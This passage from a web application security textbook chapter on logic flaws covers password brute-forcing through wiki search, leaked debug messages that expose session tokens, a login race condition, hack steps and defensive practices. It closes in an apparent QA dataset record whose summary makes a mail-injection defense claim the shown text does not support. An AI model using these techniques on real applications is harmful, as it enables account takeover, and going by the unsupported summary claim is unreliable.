itself,\neffectively disclosing details of administrative functions, passwords, and tech-\nnologies in use.\nTIP This technique has proven to be an effective attack against internal\ndocument mana gement software. The authors have used this technique to\nbrute-force a key password from a confi guration fi le that was stored in a wiki.\nBecause the wiki returned a hit if the search string appeared anywhere in the\npage (instead of matching on whole words), it was possible to brute-force the\npassword letter by letter, searching for the following:\nPassword=A\nPassword=B\nPassword=BA\n...\nExample 11: Snarfi ng Debug Messages\nThe authors encountered this logic fl aw in a web application used by a fi nancial\nservices company.\nThe Functionality\nThe application was only recently deployed. Like much new software, it still con-\ntained a number of functionality-related bugs. Intermittently, various operations\nwould fail in an unpredictable way, and users would receive an error message.\nTo facilitate the investigation of errors, developers decided to include detailed,\nverbose information in these messages, including the following details:\nn The user’s identity\nn The token for the current session\nn The URL being accessed\nn All the parameters supplied with the request that generated the error\ncc1111..iinndddd 442244 88//1199//22001111 1122::1111::4466 PPMM\n24 Stuttard c11.indd V2 - 07/26/2011 Page 425\nChapter 11 n Attacking Application Logic 425\nGenerating these messages had proven useful when help desk personnel\nattempted to investigate and recover from system failures. They also were help-\ning iron out the remaining functionality bugs.\nThe Assumption\nDespite the usual warnings from security advisers that verbose debug messages\nof this kind could potentially be misused by an attacker, the developers reasoned\nthat they were not opening any security vulnerability. The user could readily\nobtain all the information contained in the debugging message by inspecting\nthe requests and responses processed by her browser. The messages did not\ninclude any details about the actual failure, such as stack traces, so conceivably\nthey were not helpful in formulating an attack against the application.\nThe Attack\nDespite their reasoning about the contents of the debug messages, the develop-\ners’ assumption was fl awed because of mistakes they made in implementing\nthe creation of debugging messages.\nWhen an error occurred, a component of the application gathered all the\nrequired information and stored it. The user was issued an HTTP redirect to a\nURL that displayed this stored information. The problem was that the applica-\ntion’s storage of debug information, and user access to the error message, was\nnot session-based. Rather, the debugging information was stored in a static\ncontainer, and the error message URL always displayed the information that was\nlast placed in this container. Developers had assumed that users following the\nredirect would therefore see only the debug information relating to their error.\nIn fact, in this situation, ordinary users would occasionally be presented with\nthe debugging information relating to a different user’s error, because the two\nerrors had occurred almost simultaneously. But aside from questions about\nthread safety (see the next example), this was not simply a race condition. An\nattacker who discovered how the error mechanism functioned could simply\npoll the message URL repeatedly and log the results each time they changed.\nOver a period of few hours, this log would contain sensitive data about numer-\nous application users:\nn A set of usernames that could be used in a password-guessing attack\nn A set of session tokens that could be used to hijack sessions\nn A set of user-supplied input, which may contain passwords and other\nsensitive items\nThe error mechanism, therefore, presented a critical security threat. Because\nadministrative users sometimes received these detailed error messages, an\ncc1111..iinndddd 442255 88//1199//22001111 1122::1111::4466 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 426\n426 Chapter 11 n Attacking Application Logic\nattacker monitoring error messages would soon obtain suffi cient information\nto compromise the entire application.\n\nHACK STEPS\n1. To detect a flaw of this kind, first catalog all the anomalous events and\nconditions that can be generated and that involve interesting user-specific\ninformation being returned to the browser in an unusual way, such as a\ndebugging error message.\n2. Using the application as two users in parallel, systematically engineer\neach condition using one or both users, and determine whether the other\nuser is affected in each case.\nExample 12: Racing Against the Login\nThis logic fl aw has affected several major applications in the recent past.\nThe Functionality\nThe application implemented a robust, multistage login process in which users\nwere required to supply several different credentials to gain access.\nThe Assumption\nThe authentication mechanism had been subject to numerous design reviews\nand penetration tests. The owners were confi dent that no feasible means existed\nof attacking the mechanism to gain unauthorized access.\nThe Attack\nIn fact, the authentication mechanism contained a subtle fl aw. Occasionally,\nwhen a customer logged in, he gained access to the account of a completely\ndifferent user, enabling him to view all that user’s fi nancial details, and even\nmake payments from the other user’s account. The application’s behavior ini-\ntially appeared to be random: the user had not performed any unusual action to\ngain unauthorized access, and the anomaly did not recur on subsequent logins.\nAfter some investigation, the bank discovered that the error was occurring when\ntwo different users logged in to the application at precisely the same moment. It\ndid not occur on every such occasion—only on a subset of them. The root cause\nwas that the application was briefl y storing a key identifi er about each newly\nauthenticated user within a static (nonsession) variable. After being written, this\nvariable’s value was read back an instant later. If a different thread (processing\nanother login) had written to the variable during this instant, the earlier user\nwould land in an authenticated session belonging to the subsequent user.\ncc1111..iinndddd 442266 88//1199//22001111 1122::1111::4466 PPMM\n26 Stuttard c11.indd V2 - 07/26/2011 Page 427\nChapter 11 n Attacking Application Logic 427\nThe vulnerability arose from the same kind of mistake as in the error message\nexample described previously: the application was using static storage to hold\ninformation that should have been stored on a per-thread or per-session basis.\nHowever, the present example is far more subtle to detect and is more diffi cult\nto exploit because it cannot be reliably reproduced.\nFlaws of this kind are known as “race conditions” because they involve a\nvulnerability that arises for a brief period of time under certain specifi c circum-\nstances. Because the vulnerability exists only for a short time, an attacker “races”\nto exploit it before the application closes it again. In cases where the attacker is\nlocal to the application, it is often possible to engineer the exact circumstances\nunder which the race condition arises and reliably exploit the vulnerability\nduring the available window. Where the attacker is remote to the application,\nthis is normally much harder to achieve.\nA remote attacker who understood the nature of the vulnerability could\nconceivably have devised an attack to exploit it by using a script to log in con-\ntinuously and check the details of the account accessed. But the tiny window\nduring which the vulnerability could be exploited meant that a huge number\nof requests would be required.\nIt was not surprising that the race condition was not discovered during normal\npenetration testing. The conditions in which it arose came about only when the\napplication gained a large-enough user base for random anomalies to occur, which\nwere reported by customers. However, a close code review of the authentication\nand session management logic would have identifi ed the problem.\n\nHACK STEPS\nPerforming remote black-box testing for subtle thread safety issues of this\nkind is not straightforward. It should be regarded as a specialized undertak-\ning, probably necessary only in the most security-critical of applications.\n1. Target selected items of key functionality, such as login mechanisms,\npassword change functions, and funds transfer processes.\n2. For each function tested, identify a single request, or a small number\nof requests, that a given user can use to perform a single action. Also\nfind the simplest means of confirming the result of the action, such as\nverifying that a given user’s login has resulted in access to that person’s\naccount information.\n3. Using several high-spec machines, accessing the application from differ-\nent network locations, script an attack to perform the same action repeat-\nedly on behalf of several different users. Confirm whether each action has\nthe expected result.\n4. Be prepared for a large volume of false positives. Depending on the\nscale of the application’s supporting infrastructure, this activity may well\namount to a load test of the installation. Anomalies may be experienced\nfor reasons that have nothing to do with security.\ncc1111..iinndddd 442277 88//1199//22001111 1122::1111::4466 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 428\n428 Chapter 11 n Attacking Application Logic\nAvoiding Logic Flaws\nJust as there is no unique signature by which logic fl aws in web applications\ncan be identifi ed, there is also no silver bullet that will protect you. For example,\nthere is no equivalent to the straightforward advice of using a safe alternative\nto a dangerous API. Nevertheless, a range of good practices can be applied to\nsignifi cantly reduce the risk of logical fl aws appearing within your applications:\nn Ensure that every aspect of the application’s design is clearly documented\nin suffi cient detail for an outsider to understand every assumption the\ndesigner made. All such assumptions should be explicitly recorded within\nthe design documentation.\nn Mandate that all source code is clearly commented to include the follow-\ning information throughout:\nn The purpose and intended uses of each code component.\nn The assumptions made by each component about anything that is\noutside of its direct control.\nn References to all client code that uses the component. Clear documenta-\ntion to this effect could have prevented the logic fl aw within the online\nregistration functionality. (Note that “client” here refers not to the user\nend of the client/server relationship but to other code for which the\ncomponent being considered is an immediate dependency.)\nn During security-focused reviews of the application design, refl ect on every\nassumption made within the design, and try to imagine circumstances\nunder which each assumption might be violated. Focus on any assumed\nconditions that could conceivably be within the control of application users.\nn During security-focused code reviews, think laterally about two key areas:\nthe ways in which the application will handle unexpected user behavior,\nand the potential side effects of any dependencies and interoperation\nbetween different code components and different application functions.\nIn relation to the specifi c examples of logic fl aws we have described, a number\nof individual lessons can be learned:\nn Be constantly aware that users control every aspect of every request (see\nChapter 1). They may access multistage functions in any sequence. They\nmay submit parameters that the application did not ask for. They may\nomit certain parameters, not just interfere with the parameters’ values.\nn Drive all decisions regarding a user’s identity and status from her session (see\nChapter 8). Do not make any assumptions about the user’s privileges on the\nbasis of any other feature of the request, including the fact that it occurs at all.\ncc1111..iinndddd 442288 88//1199//22001111 1122::1111::4466 PPMM\n\n28 Stuttard c11.indd V2 - 07/26/2011 Page 429\nChapter 11 n Attacking Application Logic 429\nn When implementing functions that update session data on the basis of\ninput received from the user, or actions performed by the user, carefully\nconsider any impact that the updated data may have on other functionality\nwithin the application. Be aware that unexpected side effects may occur\nin entirely unrelated functionality written by a different programmer or\neven a different development team.\nn If a search function is liable to index sensitive data that some users are\nnot authorized to access, ensure that the function does not provide any\nmeans for those users to infer information based on search results. If\nappropriate, maintain several search indexes based on different levels of\nuser privilege, or perform dynamic searches of information repositories\nwith the privileges of the requesting user.\nn Be extremely wary of implementing any functionality that enables any\nuser to delete items from an audit trail. Also, consider the possible impact\nof a high-privileged user creating another user of the same privilege level\nin heavily audited applications and dual-authorization models.\nn When carrying out checks based on numeric business limits and thresh-\nolds, perform strict canonicalization and data validation on all user input\nbefore processing it. If negative numbers are not expected, explicitly reject\nrequests that contain them.\nn When implementing discounts based on order volumes, ensure that orders\nare fi nalized before actually applying the discount.\nn When escaping user-supplied data before passing to a potentially vulner-\nable application component, always be sure to escape the escape character\nitself, or the entire validation mechanism may be broken.\nn Always use appropriate storage to maintain any data that relates to an\nindividual user—either in the session or in the user’s profi le.\nSummary\nAttacking an application’s logic involves a mixture of systematic probing and\nlateral thinking. We have described various key checks that you should always\ncarry out to test the application’s behavior in response to unexpected input.\nThese include removing parameters from requests, using forced browsing to\naccess functions out of sequence, and submitting parameters to different loca-\ntions within the application. Often, how an application responds to these actions\npoints toward some defective assumption that you can violate, to malicious effect.\nIn addition to these basic tests, the most important challenge when probing\nfor logic fl aws is to try to get inside the developers’ minds. You need to under-\nstand what they were trying to achieve, what assumptions they probably made,\ncc1111..iinndddd 442299 88//1199//22001111 1122::1111::4466 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 430\n430 Chapter 11 n Attacking Application Logic\nwhat shortcuts they probably took, and what mistakes they may have made.\nImagine that you were working on a tight deadline, worrying primarily about\nfunctionality rather than security, trying to add a new function to an existing\ncode base, or using poorly documented APIs written by someone else. In that\nsituation, what would you get wrong, and how could it be exploited?\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. What is forced browsing, and what kinds of vulnerabilities can it be used\nto identify?\n2. An application applies various global fi lters on user input, designed to\nprevent different categories of attack. To defend against SQL injection,\nit doubles up any single quotation marks that appear in user input. To\nprevent buffer overfl ow attacks against some native code components, it\ntruncates any overlong items to a reasonable limit.\nWhat might go wrong with these fi lters?\n3. What steps could you take to probe a login function for fail-open condi-\ntions? (Describe as many different tests as you can think of.)\n4. A banking application implements a multistage login mechanism that is\nintended to be highly robust. At the fi rst stage, the user enters a username\nand password. At the second stage, the user enters the changing value on\na physical token she possesses, and the original username is resubmitted\nin a hidden form fi eld.\nWhat logic fl aw should you immediately check for?\n5. You are probing an application for common categories of vulnerability\nby submitting crafted input. Frequently, the application returns verbose\nerror messages containing debugging information. Occasionally, these\nmessages relate to errors generated by other users. When this happens,\nyou are unable to reproduce the behavior a second time. What logic fl aw\nmight this indicate, and how should you proceed?\ncc1111..iinndddd 443300 88//1199//22001111 1122::1111::4466 PPMM\n\nStuttard c12.indd V2 - 08/10/2011 Page 431",
    "question": "What is a valid defense against mail injection attacks in an application that sends user-submitted feedback emails?",
    "summary": "The chapter discusses logic flaws in web applications, which are often overlooked and harder to detect than common vulnerabilities like SQL injection. These flaws arise from flawed assumptions made by developers, such as improper handling of user input or incorrect sequence assumptions in multi-step processes. Examples include using encryption as an oracle, bypassing password change functions, and exploiting race conditions in login processes. The main defense against mail injection attacks is to disable mail relaying on the server. To find logic flaws, attackers should systematically test how the application handles user input, access functions out of sequence, and look for anomalies in error messages or unexpected behavior."
  }
]